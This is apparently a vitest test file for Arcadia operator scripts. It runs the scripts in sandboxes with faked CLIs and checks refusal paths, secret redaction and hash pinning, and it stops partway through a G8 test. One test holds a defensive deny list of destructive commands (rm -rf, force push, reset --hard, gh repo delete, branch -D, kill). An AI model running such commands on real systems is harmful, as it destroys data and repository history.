import { spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { appendFileSync, chmodSync, copyFileSync, cpSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { withDatabase } from "../src/db/connection.js";
import { createProjectWithInitialWork } from "../src/db/repositories.js";
import { discoverDocs } from "../src/docs/discover.js";
import { resolveReadySet } from "../src/docs/dispatch.js";
import { syncProjectDocs } from "../src/docs/sync.js";
import { validateOperatorScriptContract } from "../src/operatorActions/libraryContract.js";
import { initWorkspace } from "../src/workspace/initWorkspace.js";
import { buildPreservedCandidate, seedSettlement, settle } from "./helpers/settledCandidate.js";

/**
 * The G1, G6, G7 and G8 operator pairs for the disposable three-Action
 * rehearsal. Every behavioral case runs a pair copied into a throwaway
 * library with fake `mise`, `gh`, `codex`, `timeout` and `sleep` on PATH, so
 * no case reaches GitHub, production policy, a model or a service.
 */
const repoRoot = path.resolve(import.meta.dirname, "..");
const library = path.join(repoRoot, "artifacts", "generated", "operator-scripts");
const G1 = "prepare-three-action-rehearsal-fixture-2026-10-04";
const G6 = "preflight-three-action-rehearsal-2026-10-04";
const G7 = "grant-production-three-action-rehearsal-2026-10-04";
const G8 = "restore-terminal-off-three-action-rehearsal-2026-10-04";
const PAIRS = [G1, G6, G7, G8];
const source = (id: string) => readFileSync(path.join(library, `${id}.sh`), "utf8");

const directories: string[] = [];
afterEach(() => directories.splice(0).forEach((directory) => rmSync(directory, { recursive: true, force: true })));
const temp = (prefix: string) => {
  const directory = mkdtempSync(path.join(os.tmpdir(), prefix));
  directories.push(directory);
  return directory;
};

type Reply = { stdout?: string; stderr?: string; status?: number; exec?: string; passthrough?: "probe" | "cli" };
type Replies = Record<string, Reply | Reply[]>;

// Fake CLIs answer from a JSON table; an array is consumed in order and its
// last entry repeats. Every call is appended to calls.log.
const FAKE = `#!/usr/bin/env node
const fs = require("fs"), path = require("path");
const root = process.env.FAKE_ROOT, name = path.basename(process.argv[1]), args = process.argv.slice(2);
fs.appendFileSync(path.join(root, "calls.log"), name + " " + JSON.stringify(args) + "\\n");
const replies = JSON.parse(fs.readFileSync(path.join(root, "replies.json"), "utf8"));
let key = name + " " + args.join(" ");
let program = "";
if (name === "mise") {
  const rest = args.slice(2);
  if (rest[0] === "pnpm") key = "arcadia " + rest.slice(3).filter((a) => !a.startsWith("--")).slice(0, 2).join(" ");
  else if (rest.includes("src/cli.ts")) key = "cli " + rest.slice(rest.indexOf("src/cli.ts") + 1).filter((a) => !a.startsWith("--")).slice(0, 2).join(" ");
  else if (rest.includes("tsx")) {
    program = fs.readFileSync(0, "utf8");
    key = program.includes("syncProjectDocs") ? "probe fixture" : program.includes("fixtureSessions") ? "probe sessions" : program.includes("checkProviderSignIn") ? "probe claude"
      : program.includes("classifyPreservedCandidate") ? "probe classify"
      : program.includes("observeProviderCapacity") ? "probe capacity" : "probe leases";
  } else key = "node preflight";
}
const match = Object.keys(replies).filter((k) => key.startsWith(k)).sort((a, b) => b.length - a.length)[0];
let reply = match === undefined ? { status: 97, stderr: "unexpected call: " + key } : replies[match];
if (Array.isArray(reply)) {
  const counter = path.join(root, "counter-" + Buffer.from(match).toString("hex"));
  const n = fs.existsSync(counter) ? Number(fs.readFileSync(counter, "utf8")) : 0;
  fs.writeFileSync(counter, String(n + 1));
  reply = reply[Math.min(n, reply.length - 1)];
}
// "{{arg:--flag}}" in a reply is replaced by the value that followed --flag.
// "exec" answers with the output of a shell command run at call time.
if (reply.exec) reply = { ...reply, stdout: require("child_process").execSync(reply.exec, { encoding: "utf8" }) };
// "passthrough" runs the real Arcadia code from this checkout instead of a canned answer:
// "probe" runs the stdin program, "cli" runs the real CLI against the box's throwaway workspace.
if (reply.passthrough) {
  const env = { ...process.env };
  delete env.VITEST;
  const real = process.env.FAKE_ARCADIA_ROOT;
  const argv = reply.passthrough === "probe"
    ? ["--import", "tsx", "--input-type=module", "-", ...args.slice(args.indexOf("-") + 1)]
    : ["--import", "tsx", path.join(real, "src", "cli.ts"), ...args.slice(args.indexOf("arcadia") + 1), "--workspace", process.env.FAKE_WORKSPACE];
  const run = require("child_process").spawnSync(process.execPath, argv, { cwd: real, input: program, env, encoding: "utf8", timeout: 60000 });
  process.stdout.write(run.stdout || "");
  process.stderr.write(run.stderr || "");
  process.exit(run.status === null ? 98 : run.status);
}
if (reply.stdout) process.stdout.write(reply.stdout.replace(/[{][{]arg:([^}]+)[}][}]/g, (_m, flag) => args[args.indexOf(flag) + 1] ?? ""));
if (reply.stderr) process.stderr.write(reply.stderr);
process.exit(reply.status ?? 0);
`;

function git(cwd: string, args: string[]) {
  const run = spawnSync("git", args, { cwd, encoding: "utf8" });
  if (run.status !== 0) throw new Error(`git ${args.join(" ")}: ${run.stderr}`);
  return run.stdout.trim();
}

/** A throwaway Arcadia checkout whose library holds one copied pair. */
const REAL_GIT = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();

function sandboxFor(id: string, replies: Replies, extraLibraryFiles: Record<string, string> = {}) {
  const root = temp("arcadia-three-action-pair-");
  const checkout = path.join(root, "arcadia");
  const scripts = path.join(checkout, "artifacts", "generated", "operator-scripts");
  const bin = path.join(root, "bin");
  const home = path.join(root, "home");
  mkdirSync(scripts, { recursive: true });
  mkdirSync(bin);
  mkdirSync(home);
  mkdirSync(path.join(checkout, "scripts"));
  writeFileSync(path.join(checkout, ".gitignore"), "artifacts/\n");
  writeFileSync(path.join(checkout, "scripts", "services.sh"), [
    "#!/bin/sh",
    'if [ "$1" = restart ]; then',
    "  for v in ARCADIA_RESTART_SCRIPT ARCADIA_RESTART_ATTEMPTS ARCADIA_RESTART_RETRY_DELAY ARCADIA_MISE_BIN ARCADIA_NODE_BIN ARCADIA_WORKSPACE_DEFAULT; do",
    '    eval "test -z \\"\\${$v+x}\\"" || { echo "override $v leaked into the restart" >&2; exit 10; }',
    "  done",
    '  touch "$FAKE_ROOT/services-restarted"',
    "fi",
    "echo 'worker: running (pid 1)'",
    ""
  ].join("\n"), { mode: 0o755 });
  git(checkout, ["init", "-q", "-b", "main"]);
  git(checkout, ["-c", "user.name=t", "-c", "user.email=t@t.test", "add", "-A"]);
  git(checkout, ["-c", "user.name=t", "-c", "user.email=t@t.test", "commit", "-q", "-m", "init"]);
  git(root, ["init", "-q", "--bare", "-b", "main", "origin.git"]);
  git(checkout, ["remote", "add", "origin", path.join(root, "origin.git")]);
  git(checkout, ["push", "-q", "-u", "origin", "main"]);
  copyFileSync(path.join(library, `${id}.sh`), path.join(scripts, `${id}.sh`));
  chmodSync(path.join(scripts, `${id}.sh`), 0o755);
  copyFileSync(path.join(library, `${id}.json`), path.join(scripts, `${id}.json`));
  for (const [name, content] of Object.entries(extraLibraryFiles)) writeFileSync(path.join(scripts, name), content, { mode: 0o755 });
  for (const tool of ["mise", "gh", "codex", "pnpm"]) writeFileSync(path.join(bin, tool), FAKE, { mode: 0o755 });
  // Real Git for everything except `push`, which is recorded and never reaches a network.
  writeFileSync(path.join(bin, "git"), `#!/bin/sh\nfor a in "$@"; do if [ "$a" = push ]; then printf 'git %s\\n' "$*" >> "$FAKE_ROOT/calls.log"; exit 0; fi; done\nexec ${JSON.stringify(REAL_GIT)} "$@"\n`, { mode: 0o755 });
  writeFileSync(path.join(bin, "timeout"), "#!/bin/sh\nshift\ncase \"$*\" in *ls-remote*) [ -n \"$FAKE_LSREMOTE_TIMEOUT\" ] && exit 124;; esac\nexec \"$@\"\n", { mode: 0o755 });
  writeFileSync(path.join(bin, "sleep"), "#!/bin/sh\nexit 0\n", { mode: 0o755 });
  writeFileSync(path.join(root, "replies.json"), JSON.stringify(replies));
  writeFileSync(path.join(root, "calls.log"), "");
  const run = (env: Record<string, string | undefined> = {}, args = ["run"]) => {
    const childEnv: Record<string, string | undefined> = {
      ...process.env, PATH: `${bin}:${process.env.PATH}`, HOME: home, FAKE_ROOT: root, FAKE_ARCADIA_ROOT: repoRoot, FAKE_WORKSPACE: path.join(root, "workspace"), ...env
    };
    for (const key of ["CODEX_SANDBOX", "ARCADIA_OPERATOR_SCRIPT_ID", "ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR", "ANTHROPIC_API_KEY", "ARCADIA_REHEARSAL_GITHUB_REPO", "ARCADIA_WORKSPACE"]) {
      if (!(key in env)) delete childEnv[key];
    }
    return spawnSync("bash", [path.join(scripts, `${id}.sh`), ...args], { env: childEnv, encoding: "utf8", timeout: 60_000 });
  };
  const runDirs = () => existsSync(path.join(scripts, "runs")) ? readdirSync(path.join(scripts, "runs")).map((d) => path.join(scripts, "runs", d)) : [];
  const receipt = () => {
    const own = runDirs().sort().filter((d) => existsSync(path.join(d, "receipt.json")))
      .map((d) => ({ dir: d, json: JSON.parse(readFileSync(path.join(d, "receipt.json"), "utf8")) })).filter((r) => r.json.id === id);
    if (own.length === 0) throw new Error(`no ${id} receipt`);
    return own[own.length - 1];
  };
  const calls = () => readFileSync(path.join(root, "calls.log"), "utf8");
  return { root, checkout, scripts, home, run, runDirs, receipt, calls };
}

const ok = (data: unknown): Reply => ({ stdout: JSON.stringify({ ok: true, data }) });
const status = (desiredState: string, extra: Record<string, unknown> = {}) => ok({
  read: { status: "ok", policy: { desiredState, revision: 5, epoch: 3, authority: desiredState === "active" ? { requestId: "some-grant" } : null } },
  liveAdmissions: 0, ...extra
});
const workspaceReply = (root: string) => ok({ source: "user config", workspacePath: path.join(root, "martianrover") });

describe("three-Action rehearsal operator pairs: contract and static safety", () => {
  it.each(PAIRS)("%s passes the library contract, describes itself, and rejects any other entrypoint", (id) => {
    const descriptor = JSON.parse(readFileSync(path.join(library, `${id}.json`), "utf8"));
    expect(() => validateOperatorScriptContract(descriptor, id, source(id))).not.toThrow();
    const box = sandboxFor(id, {});
    const described = box.run({}, ["--describe"]);
    expect(described.status).toBe(0);
    expect(JSON.parse(described.stdout)).toEqual(descriptor);
    expect(box.run({}, ["apply"]).status).toBe(2);
    expect(box.runDirs()).toEqual([]);
  });

  it.each(PAIRS)("%s contains no raw kill, recursive delete, repository delete, force push or history rewrite", (id) => {
    const text = source(id);
    for (const pattern of [/\bkill\b/, /\bpkill\b/, /rm -rf/, /gh repo delete/, /--force\b/, /push\s+(-\S+\s+)*-f\b/, /reset --hard/, /worktree remove/, /branch -D/, /production reactivate/, /gh pr merge/]) {
      expect(text, `${id} must not match ${pattern}`).not.toMatch(pattern);
    }
  });

  it("only G7 previews or activates production, and G6 never turns anything Off", () => {
    for (const id of [G1, G6, G8]) expect(source(id)).not.toMatch(/production (preview|activate)/);
    expect(source(G6)).not.toMatch(/production deactivate/);
  });

  it("G7 activates exactly once, after the hermetic replay, the fresh G6 receipt and a matching preview, with the bound scope", () => {
    const text = source(G7);
    const activate = text.indexOf("arcadia production activate");
    expect(text.split("arcadia production activate").length).toBe(2);
    for (const before of ["rehearsal-three-action.test.ts", "PREFLIGHT_ID", "arcadia production preview", "scopeFingerprint"]) {
      expect(text.indexOf(before)).toBeGreaterThan(-1);
      expect(text.indexOf(before)).toBeLessThan(activate);
    }
    expect(text).toContain("--remote-preservation");
    expect(text).toContain("--concurrency 1");
    expect(text).toContain('--packet-approval-expires-at "$EXPIRES"');
    expect(text).toContain('--integration-grant-decision "$INTEGRATION_DECISION"');
    expect(text.match(/--integration-grant-action "\$PROJECT\/\$ACTION_[ABC]"/g)).toHaveLength(3);
    expect(text).toContain('--expected-revision "$REVISION"');
    expect(text).not.toMatch(/--expected-revision\s+\d/);
    const descriptor = JSON.parse(readFileSync(path.join(library, `${G7}.json`), "utf8"));
    expect(descriptor.kind).toBe("grant");
    expect(descriptor.repeatable).toBe(false);
    // The acknowledgement must sit in fields /runs renders, not in an unrendered extra key.
    expect(descriptor.operator_acknowledgement).toBeUndefined();
    expect(descriptor.problem).toMatch(/^OPERATOR ACKNOWLEDGEMENT REQUIRED BEFORE PRESSING .*issues\/925/);
    expect(descriptor.authority.does[0]).toContain("#925");
    // /runs shows title and desired_effect beside the Run button; problem and the lists are collapsed.
    expect(descriptor.title).toContain("#925");
    expect(descriptor.desired_effect).toMatch(/^Pressing accepts Decision 0058 for these three fixture Actions only \(#925\): readying the PR, pushing the settled head and reviewer-model spend/);
    expect(descriptor.authority.does.join(" ")).toContain("SIGKILL");
    expect(text.split("arcadia production preview").length).toBe(3);
    expect(text.lastIndexOf("arcadia production preview")).toBeLessThan(activate);
    expect(descriptor.authority.never_does.join(" ")).toMatch(/GitHub merge.*base branch/);
  });

  it("G8 restarts only through the hash-pinned reviewed host-service action", () => {
    const text = source(G8);
    expect(text).toContain("recover-arcadia-host-services");
    expect(text).toMatch(/RECOVER_SCRIPT_SHA256="[0-9a-f]{64}"/);
    expect(text).not.toMatch(/services\.sh restart|launchctl|worker (stop|start)/);
  });
});

describe("G1 fixture preparation refuses unsafe or missing input with a receipt", () => {
  it("refuses without the operator-supplied repository before touching GitHub or Arcadia", () => {
    const box = sandboxFor(G1, {});
    const result = box.run();
    expect(result.status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ id: G1, outcome: "refused", stage: "parameters", productionPreviewedOrActivated: false });
    expect(json.reason).toContain("ARCADIA_REHEARSAL_GITHUB_REPO is required");
    expect(existsSync(path.join(dir, "failure-handoff.md"))).toBe(true);
    expect(readFileSync(path.join(dir, "failure-handoff.md"), "utf8")).toContain("No GitHub repository was created");
    expect(box.calls()).toBe("");
  });

  it.each(["pmark/arcadia", "pmark/arcadia-three-action-rehearsal/extra", "-bad/arcadia-three-action-rehearsal", "pmark/arcadia-three-action-rehearsal-UPPER", "noslash"])(
    "refuses the unsafe identifier %s", (identifier) => {
      const box = sandboxFor(G1, {});
      expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: identifier }).status).not.toBe(0);
      expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "parameters" });
      expect(box.calls()).toBe("");
    });

  const ready = (repoView: Reply, extra: Replies = {}): Replies => ({
    "arcadia production status": status("inactive"),
    "arcadia workspace resolve": { stdout: JSON.stringify({ ok: true, data: { source: "user config", workspacePath: "/w/martianrover" } }) },
    "probe fixture": { passthrough: "probe" },
    "arcadia project list": ok({ projects: [] }),
    "gh api user": { stdout: "pmark\n" },
    "gh repo view": repoView,
    ...extra
  });
  const view = (fields: Record<string, unknown>): Reply => ({ stdout: JSON.stringify({ name: "x", owner: { login: "pmark" }, visibility: "PRIVATE", isPrivate: true, isArchived: false, isFork: false, isEmpty: false, description: "someone else's", ...fields }) });

  it.each([
    ["a public repository", view({ visibility: "PUBLIC", isPrivate: false }), "is not private"],
    ["an archived repository", view({ isArchived: true }), "archived or a fork"],
    ["a foreign non-empty private repository", view({}), "not a repository this script created"],
    ["an unknown GitHub answer", { status: 1, stderr: "HTTP 502: bad gateway" }, "unknown is not absent"]
  ])("refuses %s without creating, pushing or writing a local fixture", (_label, repoView, reason) => {
    const box = sandboxFor(G1, ready(repoView));
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: "pmark/arcadia-three-action-rehearsal-t1" }).status).not.toBe(0);
    const { json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "github_repository", githubRepositoryChanged: false });
    expect(json.reason).toContain(reason);
    expect(box.calls()).not.toMatch(/repo","create|"push"/);
    expect(existsSync(path.join(box.home, "tmp", "arcadia-three-action-rehearsal"))).toBe(false);
  });

  it("refuses a repository owned by someone other than the authenticated user", () => {
    const box = sandboxFor(G1, ready(view({}), { "gh api user": { stdout: "someone-else\n" } }));
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: "pmark/arcadia-three-action-rehearsal" }).status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "github_identity" });
  });

  it("refuses before any GitHub call when the CLI's default workspace is not martianrover", () => {
    const box = sandboxFor(G1, ready(view({}), { "arcadia workspace resolve": { stdout: JSON.stringify({ ok: true, data: { source: "user config", workspacePath: "/w/arcadia" } }) } }));
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: "pmark/arcadia-three-action-rehearsal" }).status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "preflight" });
    expect(box.receipt().json.reason).toContain("not martianrover");
    expect(box.calls()).not.toMatch(/^gh |"project","import"|"docs","sync"/m);
  });

  it("refuses while production is Active", () => {
    const box = sandboxFor(G1, ready(view({}), { "arcadia production status": status("active") }));
    expect(box.run({ ARCADIA_REHEARSAL_GITHUB_REPO: "pmark/arcadia-three-action-rehearsal" }).status).not.toBe(0);
    expect(box.receipt().json.reason).toContain("must be Inactive");
    expect(box.calls()).not.toContain("gh ");
  });
});

describe("G6 preflight refuses unknown, stale, paid or unavailable evidence", () => {
  const replies = (root: string): Replies => ({
    "arcadia workspace resolve": workspaceReply(root),
    "arcadia production status": status("inactive"),
    "arcadia go-broker status": { status: 1, stdout: JSON.stringify({ ok: false }) },
    "arcadia worker status": { stdout: "Worker: not running (no pidfile)\n" },
    "probe leases": { stdout: JSON.stringify({ active: 0, fixtureActive: [] }) },
    "probe claude": { stdout: JSON.stringify({ verdict: "signed_out" }) },
    "probe capacity": { stdout: JSON.stringify({ readOnlyReviewers: ["codex_planning"], codex: { admitted: true, freshness: "stale", confidence: "observed", usagePolicy: "included", evidence: "observed", availability: "available" } }) },
    "codex --version": { stdout: "codex 1.0\n" },
    "codex login status": { stdout: "Logged in using an API key - sk-***\n" },
    "gh auth status": { status: 0 }
  });

  it("records every check, refuses the bad ones, and never previews, activates or turns anything Off", () => {
    const box = sandboxFor(G6, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies(box.root)));
    expect(box.run().status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ id: G6, outcome: "refused", stage: "verdict", productionPreviewedOrActivated: false, policyRevision: 5 });
    const verdicts = Object.fromEntries(json.checks.map((c: { name: string; status: string }) => [c.name, c.status]));
    expect(verdicts).toMatchObject({
      arcadia_checkout: "pass", remote_main: "pass", installed_features: "refuse", workspace: "pass", production_status: "pass",
      installed_release: "refuse", worker: "refuse", fixture: "refuse", fixture_leases: "pass",
      claude_worker_token: "refuse", codex_reviewer_login: "refuse", codex_reviewer_profile: "pass",
      codex_capacity: "refuse", github_auth: "pass", github_repository: "refuse"
    });
    expect(json.checks.find((c: { name: string }) => c.name === "codex_reviewer_login").detail).toContain("paid");
    expect(existsSync(path.join(dir, "failure-handoff.md"))).toBe(true);
    expect(box.calls()).not.toMatch(/production","(preview|activate|deactivate)/);
  });

  it("refuses when origin main has moved past local main, observed afresh", () => {
    const box = sandboxFor(G6, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies(box.root)));
    const other = path.join(box.root, "other");
    git(box.root, ["clone", "-q", path.join(box.root, "origin.git"), other]);
    writeFileSync(path.join(other, "ahead.txt"), "ahead\n");
    commitAll(other, "ahead");
    git(other, ["push", "-q", "origin", "main"]);
    expect(box.run().status).not.toBe(0);
    const check = box.receipt().json.checks.find((c: { name: string }) => c.name === "remote_main");
    expect(check).toMatchObject({ status: "refuse" });
    expect(check.detail).toContain("but local main is");
  });

  it("refuses when the fresh remote observation times out", () => {
    const box = sandboxFor(G6, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify(replies(box.root)));
    expect(box.run({ FAKE_LSREMOTE_TIMEOUT: "1" }).status).not.toBe(0);
    expect(box.receipt().json.checks.find((c: { name: string }) => c.name === "remote_main")).toMatchObject({ status: "refuse" });
  });

  it("refuses a set ANTHROPIC_API_KEY without ever reading its value into the log or receipt", () => {
    const box = sandboxFor(G6, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({ ...replies(box.root), "probe claude": { stdout: JSON.stringify({ verdict: "signed_in" }) } }));
    expect(box.run({ ANTHROPIC_API_KEY: "sk-ant-secret-value-123" }).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json.checks.find((c: { name: string }) => c.name === "claude_worker_token")).toMatchObject({ status: "refuse" });
    for (const file of ["run.log", "receipt.json"]) expect(readFileSync(path.join(dir, file), "utf8")).not.toContain("sk-ant-secret-value-123");
  });

  const probeProgram = (id: string, file: string) => source(id).split(`cat > "$RUN_DIR/${file}" <<'NODE'\n`)[1].split("\nNODE")[0];
  const runProbe = (program: string, args: string[]) => {
    const env: NodeJS.ProcessEnv = { ...process.env };
    delete env.VITEST;
    return spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "-", ...args], { cwd: repoRoot, input: program, env, encoding: "utf8", timeout: 30_000 });
  };

  it("reports only the worker-context Claude Code verdict, never the token", () => {
    const workspace = temp("arcadia-g6-claude-");
    mkdirSync(path.join(workspace, "config"), { mode: 0o700 });
    const token = path.join(workspace, "config", "claude-code-oauth-token");
    writeFileSync(token, "sk-ant-oat-never-print-this", { mode: 0o600 });
    const signedIn = runProbe(probeProgram(G6, "probe-claude-sign-in.mjs"), [workspace]);
    expect(JSON.parse(signedIn.stdout)).toEqual({ verdict: "signed_in" });
    expect(signedIn.stdout + signedIn.stderr).not.toContain("never-print-this");
    chmodSync(token, 0o644);
    const refused = runProbe(probeProgram(G6, "probe-claude-sign-in.mjs"), [workspace]);
    expect(JSON.parse(refused.stdout)).toEqual({ verdict: "signed_out" });
    expect(refused.stdout + refused.stderr).not.toContain("never-print-this");
  });

  it("observes leases and fixture Sessions read-only against a real workspace database", () => {
    const workspace = path.join(temp("arcadia-g6-db-"), "workspace");
    initWorkspace(workspace);
    const leases = runProbe(probeProgram(G6, "probe-leases.mjs"), [workspace, "three-action-rehearsal"]);
    expect(JSON.parse(leases.stdout)).toEqual({ active: 0, fixtureActive: [] });
    const sessions = runProbe(probeProgram(G8, "probe-sessions.mjs"), [workspace, "three-action-rehearsal"]);
    expect(JSON.parse(sessions.stdout)).toEqual({ active: [], fixtureSessions: [] });
  });
});

describe("G7 Grant refuses before preview when its preconditions are missing", () => {
  it("refuses outside the /runs launcher without any Arcadia call", () => {
    const box = sandboxFor(G7, {});
    expect(box.run().status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ id: G7, outcome: "refused", stage: "launch_context", activated: false });
    expect(box.calls()).toBe("");
  });

  it("refuses an agent sandbox even through the launcher", () => {
    const box = sandboxFor(G7, {});
    const env = { ARCADIA_OPERATOR_SCRIPT_ID: G7, ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR: path.join(box.scripts, `${G7}.json`), CODEX_SANDBOX: "seatbelt" };
    expect(box.run(env).status).not.toBe(0);
    expect(box.receipt().json.reason).toContain("host-only");
  });

  it("refuses when main lacks the installed features, never reaching preview or activation", () => {
    const box = sandboxFor(G7, {});
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({ "arcadia workspace resolve": workspaceReply(box.root) }));
    const env = { ARCADIA_OPERATOR_SCRIPT_ID: G7, ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR: path.join(box.scripts, `${G7}.json`) };
    expect(box.run(env).status).not.toBe(0);
    const { dir, json } = box.receipt();
    expect(json).toMatchObject({ outcome: "refused", stage: "preconditions", activated: false, offCleanup: "not_attempted" });
    expect(json.reason).toContain("lacks required commit");
    expect(readFileSync(path.join(dir, "failure-handoff.md"), "utf8")).toContain("No activation was attempted");
    expect(box.calls()).not.toMatch(/production/);
  });
});

describe("G7 host replay of the hermetic three-Action rehearsal", () => {
  const program = source(G7).split("<<'PREFLIGHT'\n")[1].split("\nPREFLIGHT")[0];
  const TICK = "launches ... (the tick readying each PR and running both host review commands)";
  const report = (titles: Array<[string, string]>, failed = 0) => JSON.stringify({
    numFailedTests: failed, testResults: [{ assertionResults: titles.map(([title, s]) => ({ title, status: s })) }]
  });

  function replay(fakePnpm: string, options: { sandbox?: string; timeout?: number; reportParent?: boolean } = {}) {
    const directory = temp("arcadia-g7-replay-");
    writeFileSync(path.join(directory, "pnpm"), `#!/bin/sh\n${fakePnpm}\n`, { mode: 0o755 });
    const env: NodeJS.ProcessEnv = { ...process.env, PATH: `${directory}:${process.env.PATH}`, ARCADIA_OPERATOR_SCRIPT_ID: "live-g7", ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR: "/operator/live-g7.json" };
    delete env.CODEX_SANDBOX;
    if (options.sandbox) env.CODEX_SANDBOX = options.sandbox;
    let input = options.timeout ? program.replace("300_000", String(options.timeout)) : program;
    if (options.reportParent) input = input.replace("console.log(`Hermetic", "console.log(JSON.stringify({ id: process.env.ARCADIA_OPERATOR_SCRIPT_ID, descriptor: process.env.ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR })); console.log(`Hermetic");
    const reportPath = path.join(directory, "report.json");
    const result = spawnSync(process.execPath, ["--input-type=module", "-", directory, reportPath], { input, env, encoding: "utf8", timeout: 10_000 });
    return { directory, reportPath, result };
  }
  // The fake writes the JSON report the real vitest run would write, to the path it was given.
  const writesReport = (json: string, extra = "") => `${extra}\nfor a in "$@"; do case "$a" in --outputFile.json=*) printf '%s' '${json}' > "\${a#--outputFile.json=}";; esac; done`;

  it("refuses an agent sandbox before running any replay process", () => {
    const { directory, result } = replay("touch invoked", { sandbox: "seatbelt" });
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("host operator-action library");
    expect(existsSync(path.join(directory, "invoked"))).toBe(false);
  });

  it("propagates a failed replay so the Grant cannot continue", () => {
    const { result } = replay("echo replay-failed >&2\nexit 7");
    expect(result.status).toBe(7);
  });

  it("runs the exact suite with host validation, bounded discovery and isolated operator context, and requires every variant including the tick", () => {
    const passing = report([["simulated", "passed"], ["host commands", "passed"], [TICK, "passed"]]);
    const fake = writesReport(passing, 'test "$ARCADIA_PRESERVATION_HOST_TEST" = 1 || exit 9\ntest -z "${ARCADIA_OPERATOR_SCRIPT_ID+x}" || exit 10\ntest -z "${ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR+x}" || exit 11\nprintf "%s\\n" "$@" > "$(dirname "$0")/args"');
    const { directory, reportPath, result } = replay(fake, { reportParent: true });
    expect(result.status).toBe(0);
    expect(readFileSync(path.join(directory, "args"), "utf8").trim().split("\n")).toEqual([
      "exec", "vitest", "run", "--dir", "tests", "rehearsal-three-action.test.ts", "--reporter=default", "--reporter=json", `--outputFile.json=${reportPath}`
    ]);
    expect(JSON.parse(result.stdout.split("\n")[0])).toEqual({ id: "live-g7", descriptor: "/operator/live-g7.json" });
  });

  it.each([
    ["the tick variant is missing", report([["simulated", "passed"], ["host commands", "passed"], ["other", "passed"]])],
    ["a variant was skipped", report([["simulated", "passed"], ["host commands", "skipped"], [TICK, "passed"]])],
    ["a test failed", report([["simulated", "passed"], ["host commands", "passed"], [TICK, "passed"]], 1)]
  ])("refuses when %s even though vitest exited zero", (_label, json) => {
    const { result } = replay(writesReport(json));
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("tick-driven review variant");
  });

  it("refuses when the replay wrote no report", () => {
    const { result } = replay("exit 0");
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("no readable JSON report");
  });

  it("refuses a replay that exceeds its process deadline", () => {
    const { result } = replay("sleep 1", { timeout: 20 });
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("ETIMEDOUT");
  });
});

const realRecover = {
  "recover-arcadia-host-services.sh": readFileSync(path.join(library, "recover-arcadia-host-services.sh"), "utf8"),
  "recover-arcadia-host-services.json": readFileSync(path.join(library, "recover-arcadia-host-services.json"), "utf8")
};
const g8Env = (box: { scripts: string }) => ({ ARCADIA_OPERATOR_SCRIPT_ID: G8, ARCADIA_OPERATOR_SCRIPT_DESCRIPTOR: path.join(box.scripts, `${G8}.json`) });
const REHEARSAL_ACTIONS = ["write-start-marker", "transform-start-marker", "verify-final-rehearsal"].map((a) => `three-action-rehearsal/${a}`);
const rehearsalActive = (requestId: string, actions = REHEARSAL_ACTIONS) => ok({
  read: { status: "ok", policy: { desiredState: "active", revision: 6, epoch: 4, authority: { requestId },
    scope: { projects: ["three-action-rehearsal"], plans: ["three-action-rehearsal/autonomous-three-action-rehearsal"], actions, providers: ["claude-code-cli"] } } },
  liveAdmissions: 0
});

describe("G8 terminal Off uses only governed paths, owns only G7's policy, and never discards work", () => {
  const quiet = { stdout: JSON.stringify({ active: [], fixtureSessions: [] }) };

  it("publishes the reviewed restart pair at the exact bytes G8 pins, and the library checker accepts it", () => {
    const text = source(G8);
    const digest = (name: string) => createHash("sha256").update(readFileSync(path.join(library, name))).digest("hex");
    expect(text).toContain(`RECOVER_SCRIPT_SHA256="${digest("recover-arcadia-host-services.sh")}"`);
    expect(text).toContain(`RECOVER_DESCRIPTOR_SHA256="${digest("recover-arcadia-host-services.json")}"`);
    const descriptor = JSON.parse(realRecover["recover-arcadia-host-services.json"]);
    expect(() => validateOperatorScriptContract(descriptor, "recover-arcadia-host-services", realRecover["recover-arcadia-host-services.sh"])).not.toThrow();
  });

  it("refuses outside the /runs launcher without any Arcadia call", () => {
    const box = sandboxFor(G8, {});
    expect(box.run().status).not.toBe(0);
    expect(box.receipt().json).toMatchObject({ outcome: "refused", stage: "launch_context", restarted: false });
    expect(box.calls()).toBe("");
  });

  it.each([
    ["another request id", rehearsalActive("some-other-grant")],
    ["G7's request id with a different scope", rehearsalActive("grant-production-three-action-rehearsal-2026-10-04", REHEARSAL_ACTIONS.slice(0, 2))],
    ["an unrelated policy", status("active")]
  ])("refuses an Active policy under %s without deactivating it and names its own Off path", (_label, active) => {
    const box = sandboxFor(G8, {}, realRecover);
    writeFileSync(path.join(box.root, "replies.json"), JSON.stringify({ "arcadia production status": active, "probe sessions": quiet }));
    expect(box.run(g8Env(box)).status).not.toBe(0);
    const { dir, json } = box.receipt();
